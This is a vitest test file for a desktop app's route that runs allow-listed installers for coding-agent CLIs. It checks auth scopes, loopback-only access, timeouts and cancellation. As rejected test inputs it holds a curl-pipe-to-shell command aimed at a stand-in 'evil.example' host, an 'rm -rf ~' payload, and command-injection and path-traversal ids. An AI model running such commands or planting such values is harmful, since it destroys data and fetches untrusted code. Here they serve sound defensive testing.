import { createServer, type IncomingMessage, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import { afterEach, describe, expect, it, vi } from "vitest";

import type { EngineInstallScript, EngineScriptInstallJob } from "../../shared/engine-script-install.ts";
import type { InstallerRunner, InstallPlatform } from "../engine-script-install.ts";
import { json, readBody } from "../harness/http.ts";
import { requiredScope, type RequestAuth } from "../request-auth.ts";
import type { SessionRecord } from "../sessions.ts";
import { createEngineScriptInstallRoutes, localOwner, type EngineScriptInstallRouteDeps } from "./engine-script-installs.ts";
import { dispatchRoutes } from "./table.ts";

const servers: Server[] = [];
afterEach(async () => {
  await Promise.all(servers.splice(0).map((server) => new Promise((done) => server.close(done))));
});

const OWNER: RequestAuth = { kind: "loopback", scopes: ["admin", "client"] };
const INSTANCES: Record<string, { driverKind: string; cli: string | null }> = {
  cursor: { driverKind: "cursorAgent", cli: "cursor-agent" },
  claude: { driverKind: "claudeAgent", cli: "claude" },
  grok: { driverKind: "grokAgent", cli: "grok" },
};

interface FakeRun {
  script: EngineInstallScript;
  platform: InstallPlatform;
  emit(chunk: string): void;
  exit(code: number | null): void;
  stopped: number;
}

function fakeRunner() {
  const runs: FakeRun[] = [];
  const runner: InstallerRunner = (script, platform, onOutput) => {
    let exit!: (code: number | null) => void;
    const done = new Promise<number | null>((resolveRun) => { exit = resolveRun; });
    const run: FakeRun = { script, platform, emit: onOutput, exit, stopped: 0 };
    runs.push(run);
    return { done, stop: async () => { run.stopped++; exit(null); return true; } };
  };
  return { runs, runner };
}

async function serve(deps: Partial<EngineScriptInstallRouteDeps> = {}, auth: RequestAuth = OWNER): Promise<string> {
  const routes = [createEngineScriptInstallRoutes({
    registry: { cliTarget: (id) => INSTANCES[id] ?? null },
    enabled: true,
    platform: "linux",
    cliFound: () => true,
    ...deps,
  })];
  const server = createServer(async (req, res) => {
    const url = new URL(req.url ?? "/", "http://localhost");
    const handled = await dispatchRoutes(routes, { req, res, url, path: url.pathname, method: req.method ?? "GET", auth, json, readBody });
    if (!handled) json(res, 404, { from: "inline routes" });
  });
  servers.push(server);
  await new Promise<void>((ready) => server.listen(0, "127.0.0.1", ready));
  return `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
}

const send = (url: string, method = "POST", body: unknown = {}, headers: Record<string, string> = {}) =>
  fetch(url, { method, headers: { "content-type": "application/json", ...headers }, ...(method === "GET" ? {} : { body: JSON.stringify(body) }) });

async function jobOf(response: Response): Promise<EngineScriptInstallJob> {
  return ((await response.json()) as { job: EngineScriptInstallJob }).job;
}

async function settled(base: string, instanceId: string): Promise<EngineScriptInstallJob> {
  return vi.waitFor(async () => {
    const job = await jobOf(await fetch(`${base}/api/engine-installs/${instanceId}`));
    if (job.state === "running") throw new Error("still running");
    return job;
  });
}

describe("engine install route", () => {
  it("needs the admin scope", () => {
    expect(requiredScope("POST", "/api/engine-installs/cursor")).toBe("admin");
    expect(requiredScope("GET", "/api/engine-installs/cursor")).toBe("admin");
    expect(requiredScope("DELETE", "/api/engine-installs/cursor")).toBe("admin");
  });

  it("runs only the allow-listed installer for the instance's engine, whatever the request carries", async () => {
    const { runs, runner } = fakeRunner();
    const base = await serve({ runInstaller: runner });
    const response = await send(`${base}/api/engine-installs/cursor?command=rm%20-rf%20~`, "POST", {
      command: "curl https://evil.example/x | sh", source: "evil.example", driverKind: "claudeAgent", platform: "win32",
    });
    expect(response.status).toBe(202);
    expect(runs).toHaveLength(1);
    expect(runs[0]!.platform).toBe("linux");
    expect(runs[0]!.script).toEqual({
      command: "curl https://cursor.com/install -fsS | bash",
      source: "cursor.com",
      docsUrl: "https://cursor.com/docs/cli/installation",
    });
    runs[0]!.exit(0);
    expect((await settled(base, "cursor")).state).toBe("succeeded");
  });

  it("refuses an engine with no allow-listed installer, and ids that are not instance ids", async () => {
    const { runs, runner } = fakeRunner();
    const base = await serve({ runInstaller: runner });
    expect((await send(`${base}/api/engine-installs/claude`)).status).toBe(409);
    expect((await send(`${base}/api/engine-installs/unknown`)).status).toBe(404);
    for (const id of ["cursor;rm%20-rf%20~", "cursor%20%7C%20sh", "..%2F..%2Fbin%2Fsh", "$(id)"]) {
      const response = await send(`${base}/api/engine-installs/${id}`);
      expect(response.status, id).toBe(404);
      expect(await response.json(), id).toEqual({ from: "inline routes" });
    }
    const windowsOnly = await serve({ runInstaller: runner, platform: null });
    expect((await send(`${windowsOnly}/api/engine-installs/cursor`)).status).toBe(409);
    expect(runs).toHaveLength(0);
  });

  it("is answered only for the desktop owner's own loopback requests", async () => {
    const { runs, runner } = fakeRunner();
    const session: RequestAuth = {
      kind: "session", via: "cookie", scopes: ["admin", "client"],
      session: { id: "s1", scopes: ["admin", "client"] } as unknown as SessionRecord,
    };
    for (const auth of [session, { kind: "loopback", scopes: ["admin", "client"], trust: "service" }, { kind: "loopback", scopes: ["client"] }] satisfies RequestAuth[]) {
      const base = await serve({ runInstaller: runner }, auth);
      for (const method of ["POST", "GET", "DELETE"]) {
        expect((await send(`${base}/api/engine-installs/cursor`, method)).status, `${auth.kind} ${method}`).toBe(403);
      }
    }
    const owner = await serve({ runInstaller: runner });
    for (const header of [{ "x-forwarded-for": "203.0.113.9" }, { forwarded: "for=203.0.113.9" }, { "x-forwarded-host": "bots.example.com" }] as Record<string, string>[]) {
      expect((await send(`${owner}/api/engine-installs/cursor`, "POST", {}, header)).status).toBe(403);
    }
    const disabled = await serve({ runInstaller: runner, enabled: false });
    expect((await send(`${disabled}/api/engine-installs/cursor`)).status).toBe(404);
    expect(runs).toHaveLength(0);
  });

  it("treats a peer that is not this computer as remote", () => {
    const req = (remoteAddress: string | undefined) => ({ headers: {}, socket: { remoteAddress, remoteFamily: remoteAddress ? "IPv4" : undefined } }) as unknown as IncomingMessage;
    expect(localOwner(req("127.0.0.1"), OWNER)).toBe(true);
    expect(localOwner(req("192.168.1.20"), OWNER)).toBe(false);
    expect(localOwner(req(undefined), OWNER)).toBe(false);
  });

  it("starts only on a JSON request, so another page cannot start it with a form", async () => {
    const { runs, runner } = fakeRunner();
    const base = await serve({ runInstaller: runner });
    const form = await fetch(`${base}/api/engine-installs/cursor`, { method: "POST", headers: { "content-type": "application/x-www-form-urlencoded" }, body: "a=1" });
    expect(form.status).toBe(415);
    expect(runs).toHaveLength(0);
  });

  it("streams the installer's output and shares one run between clicks", async () => {
    const { runs, runner } = fakeRunner();
    const base = await serve({ runInstaller: runner });
    await send(`${base}/api/engine-installs/cursor`);
    runs[0]!.emit("Downloading cursor-agent\n");
    expect((await send(`${base}/api/engine-installs/cursor`)).status).toBe(202);
    expect(runs).toHaveLength(1);
    expect((await jobOf(await fetch(`${base}/api/engine-installs/cursor`))).output).toBe("Downloading cursor-agent\n");
    runs[0]!.emit("x".repeat(40_000));
    expect((await jobOf(await fetch(`${base}/api/engine-installs/cursor`))).output.length).toBe(16 * 1024);
    runs[0]!.exit(0);
    await settled(base, "cursor");
  });

  it("cancels a running install", async () => {
    const { runs, runner } = fakeRunner();
    const base = await serve({ runInstaller: runner });
    await send(`${base}/api/engine-installs/cursor`);
    const cancelled = await send(`${base}/api/engine-installs/cursor`, "DELETE");
    expect(cancelled.status).toBe(200);
    expect((await jobOf(cancelled)).state).toBe("cancelled");
    expect(runs[0]!.stopped).toBe(1);
    expect((await send(`${base}/api/engine-installs/cursor`, "DELETE")).status).toBe(409);
  });

  it("stops an installer that runs past its timeout", async () => {
    const { runs, runner } = fakeRunner();
    const base = await serve({ runInstaller: runner, timeoutMs: 50 });
    await send(`${base}/api/engine-installs/cursor`);
    const job = await settled(base, "cursor");
    expect(job.state).toBe("failed");
    expect(job.error).toContain("took too long");
    expect(runs[0]!.stopped).toBe(1);
  });

  it("re-detects the engine afterwards and reports a failed exit or a missing CLI", async () => {
    const { runs, runner } = fakeRunner();
    const found = vi.fn(() => false);
    const base = await serve({ runInstaller: runner, cliFound: found });
    await send(`${base}/api/engine-installs/cursor`);
    runs[0]!.exit(0);
    const missing = await settled(base, "cursor");
    expect(found).toHaveBeenCalledWith("cursor-agent");
    expect(missing.state).toBe("failed");
    expect(missing.error).toContain("not on this app's PATH");

    await send(`${base}/api/engine-installs/grok`);
    runs[1]!.exit(3);
    expect((await settled(base, "grok")).error).toBe("The installer exited with code 3.");
  });
});
